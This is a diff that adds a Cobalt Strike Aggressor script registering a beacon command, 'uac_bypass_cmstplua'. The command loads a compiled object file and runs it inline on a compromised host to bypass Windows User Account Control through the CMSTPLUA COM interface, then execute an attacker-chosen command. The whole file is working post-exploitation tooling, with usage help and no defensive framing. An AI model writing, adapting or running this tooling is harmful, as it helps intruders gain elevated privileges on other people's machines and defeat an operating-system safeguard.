@@ -1,0 +1,41 @@
+alias uac_bypass_cmstplua {
+	local('$barch $file $handle $object $parameters $args');
+
+	if(size(@_) == 1) {
+        berror($1, beacon_command_detail("uac_bypass_cmstplua"));
+        berror($1, "Please specify a command to execute");
+        return;
+    }
+
+	# Find and log object file
+	$barch = barch($1);
+	$file = script_resource("UACBypassCMSTPLUA. $+ $barch $+ .o");
+	blog($1, $file);
+
+	# Read the object file
+	$handle = openf($file);
+	$object = readb($handle, -1);
+	closef($handle);
+
+	# Pack empty arguments
+	$args = bof_pack($1, "zz", $2, substr($0, size($1) + size($2) + 2));
+
+	# Log the current task
+	btask($1, "Tasked beacon to run UACBypassCMSTPLUA!");
+
+	# Run the object file
+	beacon_inline_execute($1, $object, "go", $args);
+}
+
+beacon_command_register(
+    "uac_bypass_cmstplua",
+    "Execute the given command (in a new process, without waiting for output) while bypassing UAC using CMSTPLUA.",
+    "
+Command: uac_bypass_cmstplua
+Summary: Bypass UAC using CMSTPLUA and execute the given command!
+
+Usage:   uac_bypass_cmstplua <FILE> <PARAMETERS>
+         FILE          Required    The file to execute as shell command.
+         PARAMETERS    Optional    The arguments to pass to the file.
+"
+);
